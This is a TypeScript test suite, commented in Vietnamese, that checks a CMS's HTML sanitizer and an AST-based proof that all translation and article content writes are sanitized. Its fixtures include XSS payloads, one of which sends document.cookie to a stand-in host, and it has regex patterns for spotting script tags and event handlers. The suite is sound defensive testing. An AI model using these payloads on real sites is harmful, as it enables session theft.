import assert from 'node:assert/strict'
import { readdirSync, readFileSync } from 'node:fs'
import { join } from 'node:path'
import test from 'node:test'
import { sanitizeBlockData, sanitizeHtml } from '../server/utils/sanitize-html'
import { sanitizeTranslationFields, stripMarkup } from '../server/utils/translation-html'
import { ROOT as ROOT_DIR, allTranslationWrites, translationWritesIn } from './_translation-writes'
import { parse } from './_call-sites'

/**
 * Bản dịch được hiển thị bằng `v-html` y như bài gốc, nhưng trước đây bài gốc
 * được lọc lúc ghi còn bản dịch thì không — ở bài viết (`article_translations`,
 * cả sửa tay lẫn AI dịch) và ở khối trang (`data.translations[lang]`, mà lớp lọc
 * khối chỉ nhìn cấp ngoài). Các test này giữ cả ba đường đã đóng, và chặn một đường
 * ghi mới bỏ sót. Lọc lúc ĐỌC ở hai endpoint công khai (`articles/[slug]`,
 * `pages/[slug]`) được kiểm bằng cách chạy handler thật trên hàng độc hại đã lưu:
 * `tests/public-translation-sanitize-behavior.test.ts`.
 */

const read = (path: string) => readFileSync(new URL(path, import.meta.url), 'utf8')

const EXECUTABLE = /<\s*(script|object|embed|svg|math|style|form|input|button)\b/i
const EVENT_HANDLER = /\son[a-z]+\s*=/i
const DANGEROUS_SCHEME = /(javascript|vbscript|data:text\/html)\s*:/i
const neutralised = (html: string) => !EXECUTABLE.test(html) && !EVENT_HANDLER.test(html) && !DANGEROUS_SCHEME.test(html)

const PAYLOADS = [
  '<p>Xin chào</p><script>fetch("//evil.test/?c="+document.cookie)</script>',
  '<img src=x onerror="alert(document.domain)">',
  '<a href="javascript:alert(1)">bấm vào đây</a>',
  '<svg onload=alert(1)><script>alert(2)</script></svg>',
  '<p onclick="alert(1)">đoạn</p>',
]

// ─── Bài viết: nội dung bản dịch ─────────────────────────────────────────────

test('translation content is neutralised and the rest of the update is untouched', () => {
  for (const payload of PAYLOADS) {
    const out = sanitizeTranslationFields({ status: 'published', progress: 100, content: payload })
    assert.ok(neutralised(out.content), `leaked: ${payload} -> ${out.content}`)
    assert.equal(out.status, 'published')
    assert.equal(out.progress, 100)
  }
})

test('legitimate translated markup survives', () => {
  const html = '<h2>Tiêu đề</h2><p>Đoạn <strong>đậm</strong> và <a href="https://example.gov.vn" target="_blank">liên kết</a>.</p><ul><li>Một</li></ul>'
  const out = sanitizeTranslationFields({ content: html }).content
  assert.match(out, /<h2>Tiêu đề<\/h2>/)
  assert.match(out, /<strong>đậm<\/strong>/)
  assert.match(out, /href="https:\/\/example\.gov\.vn"/)
  assert.match(out, /rel="noopener noreferrer"/, 'a new-tab link must not hand the page to the target')
})

test('an update without content passes through, and null stays null', () => {
  const noContent = { status: 'failed', errorMessage: 'x' }
  assert.equal(sanitizeTranslationFields(noContent), noContent)
  assert.equal(sanitizeTranslationFields({ content: null }).content, null)
})

// Hai tệp cùng giữ các đường ghi `article_translations.content`: `article-translations.ts`
// (sửa tay) và `article-translation-worker.ts` (job dịch AI, tách ra khỏi tệp trên).
/**
 * Lượt ghi `article_translations` mà phép chứng minh AST không tự đi tới được — mỗi mục nói vì sao nó vẫn
 * an toàn, và một test bên dưới kiểm đúng điều đó.
 */
const UNPROVEN_TRANSLATION_WRITES: Record<string, string> = {
  'server/services/stored-html-sanitize.ts': 'lượt dọn một lần ghi lại `content` đã qua sanitizeHtml ở bước lập kế hoạch (test kế bên)',
  'server/services/stored-plaintext-decode.ts': 'chỉ ghi title/excerpt (văn bản thuần): `changedValues` không có trường content (test kế bên)',
}
/** Miễn trừ tính theo SỐ lượt ghi trong tệp: một lượt ghi mới không chứng minh được trong tệp đã có tên phải hiện ra. */
function unprovenPerFile(writes: Array<{ site: string, ok: boolean }>): Record<string, number> {
  const counts: Record<string, number> = {}
  for (const write of writes) if (!write.ok) counts[write.site.split(':')[0]!] = (counts[write.site.split(':')[0]!] ?? 0) + 1
  return counts
}

test('every write of translation content provably goes through sanitizeHtml (AST, every server file)', () => {
  // Bản cũ đòi mỗi DÒNG `content: …` chứa `sanitizeHtml(` — `.set(body)` hay `.set({ ...body })` lọt mà cổng
  // vẫn xanh. Nay mọi `insert|update(articleTranslations)` trong server/ phải chứng minh được (tests/_translation-writes.ts).
  const writes = allTranslationWrites()
  assert.ok(writes.length >= 11, `the translation write sites must be found (got ${writes.length})`)
  assert.deepEqual(
    unprovenPerFile(writes),
    Object.fromEntries(Object.keys(UNPROVEN_TRANSLATION_WRITES).map(file => [file, 1])),
    `route the write through sanitizeTranslationFields / sanitizeHtml, or name it above with the reason it is safe:\n${writes.filter(write => !write.ok).map(write => `${write.site} — ${write.reason}`).join('\n')}`,
  )
})

const IMPORTS = "import { sanitizeHtml } from '../utils/sanitize-html'\nimport { sanitizeTranslationFields } from '../utils/translation-html'\n"

test('the proof rejects the shapes the line-based guard let through', () => {
  const check = (body: string, imports = IMPORTS) => translationWritesIn(
    join(ROOT_DIR, 'server/services/__probe.ts'),
    `${imports}async function f(tx, body, raw, fill, schema) {\n${body}\n}`,
  )[0]!
  for (const unsafe of [
    'await tx.update(articleTranslations).set(body)',
    'await tx.update(articleTranslations).set({ ...body, status: \'reviewed\' })',
    'await tx.update(articleTranslations).set({ content: raw })',
    'const content = raw\nawait tx.update(articleTranslations).set({ content })',
    'const u = { status: \'x\' }\nu.content = raw\nawait tx.update(articleTranslations).set(u)',
    'const u = {}\nObject.assign(u, body)\nawait tx.update(articleTranslations).set(u)',
    'await tx.insert(articleTranslations).values({ articleId: 1 }).onDuplicateKeyUpdate({ set: { content: raw } })',
    'const content = String(raw)\nawait tx.update(articleTranslations).set({ content })',
    'await tx.update(articleTranslations).set({ ...(raw ? { content: raw } : {}) })',
    // Các hình dạng verifier 2026-11-06 dò ra là lọt qua bản đầu của phép chứng minh:
    'await tx.update(articleTranslations).set({ \'content\': raw })',
    'await tx.update(articleTranslations).set({ [\'content\']: raw })',
    'await tx.update(articleTranslations).set({ [body.key]: raw })',
    'await tx.update(articleTranslations).set({ get content() { return raw } })',
    'const u = { content: sanitizeHtml(raw) }\nu.content += raw\nawait tx.update(articleTranslations).set(u)',
    'let content = sanitizeHtml(raw)\ncontent += raw\nawait tx.update(articleTranslations).set({ content })',
    'let u = { status: \'x\' }\nu = body\nawait tx.update(articleTranslations).set(u)',
    'const u = { status: \'x\' }\nconst v = u\nv.content = raw\nawait tx.update(articleTranslations).set(u)',
    'const u = { status: \'x\' }\nfill(u, body)\nawait tx.update(articleTranslations).set(u)',
    'const u = { content: sanitizeHtml(raw) }\nif (raw) { const u = body\n await tx.update(articleTranslations).set(u) }',
    'await tx.update(schema.articleTranslations).set({ content: raw })',
  ]) assert.equal(check(unsafe).ok, false, unsafe)
  // `sanitizeHtml` tự viết (không phải hàm import từ utils/sanitize-html) không chứng minh gì.
  assert.equal(check('await tx.update(articleTranslations).set({ content: sanitizeHtml(raw) })', 'const sanitizeHtml = (value) => value\n').ok, false, 'local sanitizeHtml')
  assert.equal(check('await tx.update(articleTranslations).set({ content: sanitizeHtml(raw) })', '').ok, false, 'sanitizeHtml not imported')
  for (const safe of [
    'await tx.update(articleTranslations).set(sanitizeTranslationFields(body))',
    'await tx.update(articleTranslations).set({ content: sanitizeHtml(raw), status: \'done\' })',
    'const u = { status: \'x\' }\nif (raw) u.content = sanitizeHtml(raw)\nawait tx.update(articleTranslations).set(u)',
    'await tx.update(articleTranslations).set({ status: \'failed\' })',
    'const content = sanitizeHtml(raw)\nawait tx.insert(articleTranslations).values({ articleId: 1, content })',
    'const u = {}\nu.content = sanitizeHtml(raw)\nawait db.transaction(async (t) => { await t.update(articleTranslations).set(u) })',
    'await tx.update(articleTranslations).set({ ...(raw ? { progress: 1 } : { progress: 0 }) })',
    'const u = { status: \'x\' }\nu.content = sanitizeHtml(raw)\nconst fields = Object.keys(u)\nawait tx.update(articleTranslations).set(u)',
    'await tx.update(articleTranslations).set({ \'content\': sanitizeHtml(raw) })',
  ]) assert.equal(check(safe).ok, true, safe)
})

/**
 * Lượt ghi dời từ handler sang service (2026-11-08): payload là THAM SỐ của hàm service, còn giá trị — và lượt
 * lọc — ở handler. Phép chứng minh đi từ tham số tới MỌI lời gọi (`tests/_call-sites.ts`); mọi thứ làm tập lời gọi
 * không liệt kê được, hay một nơi gọi trao giá trị chưa lọc, đều không đạt.
 */
test('a payload handed to a service as a parameter is proven at every call site, or not at all', () => {
  const SERVICE = join(ROOT_DIR, 'server/services/__probe-write.ts')
  const HANDLER = join(ROOT_DIR, 'server/api/admin/__probe.post.ts')
  const SCRIPT = join(ROOT_DIR, 'scripts/__probe.ts')
  const service = (body = 'await tx.update(articles).set(fields)', params = 'tx, id, fields') =>
    `import { articles } from '../db/schema'\nexport async function save(${params}) {\n${body}\n}\n`
  const handler = (body: string, importLine = "import { save } from '../../services/__probe-write'") =>
    `import { sanitizeHtml } from '../../utils/sanitize-html'\n${importLine}\nexport default defineEventHandler(async (event) => {\nconst body = await readBody(event)\n${body}\n})\n`
  const prove = (files: Record<string, string>, serviceFile = SERVICE) => {
    const index = new Map(Object.entries(files).map(([file, text]) => [file, parse(file, text)]))
    const writes = translationWritesIn(serviceFile, files[serviceFile]!, 'articles', index)
    assert.equal(writes.length, 1, 'the probe service holds one article write')
    return writes[0]!
  }

  for (const safe of [
    'const u = {}\nu.content = sanitizeHtml(body.content)\nawait save(tx, 1, u)',
    'await save(tx, 1, { title: body.title, content: sanitizeHtml(body.content) })',
    'const content = sanitizeHtml(body.content)\nawait save(tx, 1, { content, status: \'x\' })',
    'const u = { status: \'x\' }\nawait save(tx, 1, u)',
  ]) assert.equal(prove({ [SERVICE]: service(), [HANDLER]: handler(safe) }).ok, true, safe)
  // Two hops: the handler hands a sanitized object to a relay, which hands its own parameter on.
  const RELAY = join(ROOT_DIR, 'server/services/__probe-relay.ts')
  const relay = "import { save } from './__probe-write'\nexport async function relay(tx, f) {\nawait save(tx, 1, f)\n}\n"
  const viaRelay = (body: string) => handler(body, "import { relay } from '../../services/__probe-relay'")
  assert.equal(prove({ [SERVICE]: service(), [RELAY]: relay, [HANDLER]: viaRelay('await relay(tx, { content: sanitizeHtml(body.content) })') }).ok, true, 'relay, sanitized')
  assert.equal(prove({ [SERVICE]: service(), [RELAY]: relay, [HANDLER]: viaRelay('await relay(tx, body)') }).ok, false, 'relay, raw body')

  for (const unsafe of [
    'await save(tx, 1, body)',
    'await save(tx, 1, { ...body })',
    'const u = {}\nu.content = body.content\nawait save(tx, 1, u)',
    'const u = { content: sanitizeHtml(body.content) }\nawait save(tx, 1, u)\nu.content = body.content',
    'const u = {}\nObject.assign(u, body)\nawait save(tx, 1, u)',
    'await save(...[tx, 1, { content: sanitizeHtml(body.content) }])',
    'await save(tx, 1)',
    'const f = save\nawait f(tx, 1, { content: sanitizeHtml(body.content) })',
    'await Promise.all([1].map(save))',
  ]) assert.equal(prove({ [SERVICE]: service(), [HANDLER]: handler(unsafe) }).ok, false, unsafe)

  const good = handler('await save(tx, 1, { content: sanitizeHtml(body.content) })')
  // Inside the service, the parameter follows the rules of a local.
  for (const [body, params] of [
    ['fields.content = raw\nawait tx.update(articles).set(fields)', 'tx, id, fields, raw'],
    ['log(fields)\nawait tx.update(articles).set(fields)', 'tx, id, fields'],
    ['fields = raw\nawait tx.update(articles).set(fields)', 'tx, id, fields, raw'],
    ['await tx.update(articles).set(fields)', 'tx, id, fields = {}'],
    ['await tx.update(articles).set(fields)', 'tx, id, ...fields'],
    ['alias.content = raw\nawait tx.update(articles).set(fields)', 'tx, id, fields, raw, alias = fields'],
    ['arguments[2].content = raw\nawait tx.update(articles).set(fields)', 'tx, id, fields, raw'],
    ['if (raw) { var fields = raw }\nawait tx.update(articles).set(fields)', 'tx, id, fields, raw'],
    ['try { throw raw } catch (fields) { await tx.update(articles).set(fields) }', 'tx, id, fields, raw'],
  ] as const) assert.equal(prove({ [SERVICE]: service(body, params), [HANDLER]: good }).ok, false, `service: ${body} (${params})`)
  // Every caller counts, scripts/ included; a function nobody calls proves nothing.
  assert.equal(prove({ [SERVICE]: service() }).ok, false, 'no caller')
  assert.equal(prove({ [SERVICE]: service(), [HANDLER]: good, [SCRIPT]: "import { save } from '../server/services/__probe-write'\nawait save(tx, 1, process.argv)\n" }).ok, false, 'a script passes raw input')
  assert.equal(prove({ [SERVICE]: service(), [HANDLER]: good, [SCRIPT]: "import { save } from '../server/services/__probe-write.js'\nawait save(tx, 1, process.argv)\n" }).ok, false, 'a .js-suffixed import passes raw input')
  // Calls that cannot be listed.
  const BARREL = join(ROOT_DIR, 'server/services/__probe-barrel.ts')
  for (const [label, extra] of [
    ['namespace import', { [HANDLER]: handler('await probe.save(tx, 1, { content: sanitizeHtml(body.content) })', "import * as probe from '../../services/__probe-write'") }],
    ['re-export', { [HANDLER]: good, [BARREL]: "export { save } from './__probe-write'\n" }],
    ['export *', { [HANDLER]: good, [BARREL]: "export * from './__probe-write'\n" }],
    ['dynamic import', { [HANDLER]: good, [SCRIPT]: "const m = await import('../server/services/__probe-write')\n" }],
    ['require', { [HANDLER]: good, [SCRIPT]: "const m = require('../server/services/__probe-write')\n" }],
    ['createRequire', { [HANDLER]: good, [SCRIPT]: "import { createRequire } from 'node:module'\ncreateRequire(import.meta.url)('../server/services/__probe-write.js').save(tx, 1, process.argv)\n" }],
    ['alias import with .js', { [HANDLER]: good, [SCRIPT]: "import { save } from '~~/server/services/__probe-write.js'\nawait save(tx, 1, process.argv)\n" }],
    ['typeof', { [HANDLER]: handler('type Save = typeof save\nawait save(tx, 1, { content: sanitizeHtml(body.content) })') }],
    ['alias import', { [HANDLER]: handler('await save(tx, 1, { content: sanitizeHtml(body.content) })', "import { save } from '~~/server/services/__probe-write'") }],
    ['export { save }', { [HANDLER]: good, [SERVICE]: `${service()}export { save as store }\n` }],
  ] as const) assert.equal(prove({ [SERVICE]: service(), ...extra }).ok, false, label)
  // A default export, and a file Nitro auto-imports (`server/utils/**`): their callers need no import line.
  assert.equal(prove({ [SERVICE]: service().replace('export async function', 'export default async function'), [HANDLER]: good }).ok, false, 'default export')
  const UTIL = join(ROOT_DIR, 'server/utils/__probe-write.ts')
  assert.equal(prove({ [UTIL]: service(), [HANDLER]: handler('await save(tx, 1, { content: sanitizeHtml(body.content) })', "import { save } from '../../utils/__probe-write'") }, UTIL).ok, false, 'server/utils')
  // Without the call index (a single file on its own), a parameter is never proven — as before.
  assert.equal(translationWritesIn(SERVICE, service(), 'articles')[0]!.ok, false, 'no index')
})

/**
 * Bài viết GỐC dùng cùng phép chứng minh: `articles.content` là bề mặt `v-html` công khai chính. Hành vi đường
 * ghi gốc đã có test chạy thật (`tests/article-write-sanitize-behavior.test.ts`); phép chứng minh này bắt đường
 * ghi MỚI ở bất kỳ đâu trong server/ — kể cả qua biến dựng dần hay spread.
 */
const UNPROVEN_ARTICLE_WRITES: Record<string, string> = {
  'server/services/stored-plaintext-decode.ts': 'chỉ ghi title/excerpt: `changedValues` không có trường content (test kế bên)',
}

test('every write of article content provably goes through sanitizeHtml (AST, every server file)', () => {
  const writes = allTranslationWrites('articles')
  assert.ok(writes.length >= 6, `the article write sites must be found (got ${writes.length})`)
  assert.deepEqual(
    unprovenPerFile(writes),
    Object.fromEntries(Object.keys(UNPROVEN_ARTICLE_WRITES).map(file => [file, 1])),
    `sanitize article content with sanitizeHtml before the write, or name the site above with the reason it is safe:\n${writes.filter(write => !write.ok).map(write => `${write.site} — ${write.reason}`).join('\n')}`,
  )
})

/**
 * Câu SQL thô ghi `content` của bài viết/bản dịch không đi qua phép chứng minh AST. Chỉ được có ở các công cụ vá
 * URL bên trong HTML ĐÃ LƯU (đã lọc lúc ghi) — không nhận đầu vào người dùng. Kiểm vắng mặt (đọc chữ là đủ), tính
 * theo SỐ câu trong mỗi tệp: thêm một câu mới vào tệp đã có tên cũng phải được nhìn thấy.
 */
const RAW_CONTENT_WRITERS: Record<string, { statements: number, reason: string }> = {
  'server/db/legacy-media-urls.ts': { statements: 1, reason: 'vá URL ảnh cũ bên trong nội dung đã lưu lúc khởi động' },
  'server/services/media-repair.ts': { statements: 5, reason: 'vá tiền tố localhost bên trong nội dung đã lưu (REPLACE trên chính cột đó)' },
}
/**
 * Câu ghi mà BẢNG là một biểu thức (`UPDATE ${target.table} SET ${target.column} = …`) — không biết bảng nào nên
 * không đếm được bằng chữ; gồm cả `articles.content` và `article_translations.content` qua `URL_REFERENCE_TARGETS`.
 * An toàn vì chỉ thay URL, và `assertRewritable` (`media-sync-url-match.ts`) từ chối URL có ký tự HTML
 * (`" ' < > \` \t\r\n`) — không chèn được thẻ hay thuộc tính.
 */
const DYNAMIC_TABLE_WRITERS: Record<string, string> = {
  'server/services/media-repoint.ts': 'đổi domain URL ảnh trong các cột tham chiếu; assertRewritable trước khi thay',
  'server/services/media-sync-rewrite.ts': 'thay URL local ↔ R2 trong các cột tham chiếu; assertRewritable trước khi thay',
}

function serverSources(): Array<[string, string]> {
  const out: Array<[string, string]> = []
  const walk = (dir: string) => {
    for (const entry of readdirSync(dir, { withFileTypes: true })) {
      const full = join(dir, entry.name)
      if (entry.isDirectory()) { walk(full); continue }
      if (/\.(ts|mjs)$/.test(entry.name)) out.push([full.slice(ROOT_DIR.length + 1), readFileSync(full, 'utf8')])
    }
  }
  walk(join(ROOT_DIR, 'server'))
  return out
}

test('raw SQL writes article/translation content only in the named URL-repair tools, statement for statement', () => {
  const found: Record<string, number> = {}
  for (const [rel, text] of serverSources()) {
    // UPDATE … SET content …  và  INSERT INTO … (…, content, …): mọi câu trên hai bảng có nhắc tới cột content.
    const count = text.match(/(UPDATE|INSERT\s+INTO)\s+`?(articles|article_translations)`?[\s(][^;]*?\bcontent\b/gi)?.length ?? 0
    if (count) found[rel] = count
  }
  const expected = Object.fromEntries(Object.entries(RAW_CONTENT_WRITERS).map(([file, entry]) => [file, entry.statements]))
  assert.deepEqual(found, expected, 'write content through Drizzle after sanitizeHtml, or name the statement above with the reason no user input reaches it')
})

test('SQL whose table is an expression is only in the URL rewriters, and they check every URL first', () => {
  const found = serverSources()
    .filter(([, text]) => /(UPDATE|INSERT\s+INTO|DELETE\s+FROM)\s+`?\$\{[A-Za-z_$][\w$]*\.[\w$.]+\}/.test(text))
    .map(([rel]) => rel)
    .sort()
  assert.deepEqual(found, Object.keys(DYNAMIC_TABLE_WRITERS).sort(), 'a write to a table chosen at run time escapes every check above — name it with its reason')
  for (const file of Object.keys(DYNAMIC_TABLE_WRITERS)) {
    assert.match(readFileSync(join(ROOT_DIR, file), 'utf8'), /assertRewritable\(/, `${file} no longer checks URLs before rewriting stored HTML`)
  }
})

test('the plain-text decode tool writes no translation content', () => {
  const source = read('../server/services/stored-plaintext-decode.ts')
  const body = source.slice(source.indexOf('function changedValues('), source.indexOf('function scanArticles('))
  assert.match(body, /title/)
  assert.doesNotMatch(body, /content/, 'changedValues must stay title/excerpt only — it is spread into the translation update')
})

test('the one-off cleanup writes only content that went through sanitizeHtml', () => {
  const source = read('../server/services/stored-html-sanitize.ts')
  assert.match(source, /sanitizeHtml\(row\.content\)/)
  assert.match(source, /set\(\{ content: fix\.content \}\)/, 'it writes the planned (sanitized) content and nothing else')
})

// ─── Khối trang: bản dịch lồng trong data.translations ───────────────────────

test('block translations are sanitized, not only the top-level fields', () => {
  const data = sanitizeBlockData({
    html: '<p>gốc</p>',
    title: 'giữ nguyên',
    translations: {
      en: { html: PAYLOADS[0], bodyHtml: PAYLOADS[1], title: 'Plain <b>title</b>' },
      zh: { content: PAYLOADS[2] },
      fr: 'not an object',
    },
  }) as Record<string, unknown>
  const translations = data.translations as Record<string, Record<string, string> | string>
  assert.ok(neutralised((translations.en as Record<string, string>).html!))
  assert.ok(neutralised((translations.en as Record<string, string>).bodyHtml!))
  assert.ok(neutralised((translations.zh as Record<string, string>).content!))
  assert.equal((translations.en as Record<string, string>).title, 'Plain <b>title</b>', 'plain-text fields are not rewritten')
  assert.equal(translations.fr, 'not an object')
  assert.equal(data.title, 'giữ nguyên')
})

test('a hostile translations value cannot break the sanitizer', () => {
  for (const bad of [null, 'x', 7, [1, 2], { en: null }, { en: [PAYLOADS[0]] }]) {
    assert.doesNotThrow(() => sanitizeBlockData({ html: '<p>ok</p>', translations: bad }))
  }
  assert.deepEqual(sanitizeBlockData({ translations: [1] }).translations, [1])
})

test('sanitizeHtml itself still drops every payload used above', () => {
  for (const payload of PAYLOADS) assert.ok(neutralised(sanitizeHtml(payload)), payload)
})

test('title và excerpt là văn bản thuần: thẻ HTML bị gỡ, dấu < thường giữ nguyên', () => {
  assert.equal(stripMarkup('Tiêu đề <script>alert(1)</script>'), 'Tiêu đề alert(1)')
  assert.equal(stripMarkup('<b>đậm</b> và <img src=x onerror=alert(1)>'), 'đậm và ')
  assert.equal(stripMarkup('<!-- ghi chú -->xin chào'), 'xin chào')
  // thẻ lồng nhau không tái tạo thành thẻ sau một lượt gỡ: kết quả không còn dấu `<` nào
  assert.ok(!stripMarkup('<scr<script>ipt>alert(1)</scr</script>ipt>').includes('<'))
  assert.ok(!stripMarkup('<<script>script>alert(1)<</script>/script>').match(/<\/?script/i))
  // dấu so sánh / toán học không phải thẻ
  assert.equal(stripMarkup('Dưới 5 < 10 tuổi, 3 <3 mẹ, a<b'), 'Dưới 5 < 10 tuổi, 3 <3 mẹ, a<b')
  assert.equal(stripMarkup('Không có gì'), 'Không có gì')

  const out = sanitizeTranslationFields({ title: 'T <script>x</script>', excerpt: 'E <b>y</b>', content: '<p>ok</p><script>z</script>', status: 'x' })
  assert.equal(out.title, 'T x')
  assert.equal(out.excerpt, 'E y')
  assert.ok(!/<script/i.test(out.content ?? ''))
  assert.equal((out as { status: string }).status, 'x')
  // không có trường nào cần lọc → trả đúng đối tượng cũ
  const plain = { status: 'failed' }
  assert.equal(sanitizeTranslationFields(plain), plain)
  assert.equal(sanitizeTranslationFields({ title: null }).title, null)
})

test('đường sửa tay cũng gỡ thẻ khỏi title/excerpt', () => {
  const source = read('../server/services/article-translations.ts')
  // Entities are decoded first (`decodePlainTextInput`), THEN tags are stripped, so `&lt;b&gt;` cannot survive as `<b>`.
  assert.match(source, /updates\.title = stripMarkup\(decodePlainTextInput\(data\.title\)/)
  assert.match(source, /updates\.excerpt = stripMarkup\(decodePlainTextInput\(data\.excerpt\)/)
})

test('bản dịch: entity được giải mã TRƯỚC khi gỡ thẻ — `&lt;b&gt;` không sống sót thành `<b>`', () => {
  const out = sanitizeTranslationFields({ title: 'Ng&agrave;y &lt;b&gt;x&lt;/b&gt;', excerpt: 'C&Ocirc;NG &lt;script&gt;alert(1)&lt;/script&gt; t&aacute;c' })
  assert.equal(out.title, 'Ngày x')
  assert.ok(!out.excerpt!.includes('<'), out.excerpt!)
  assert.match(out.excerpt!, /^CÔNG .*tác$/)
})
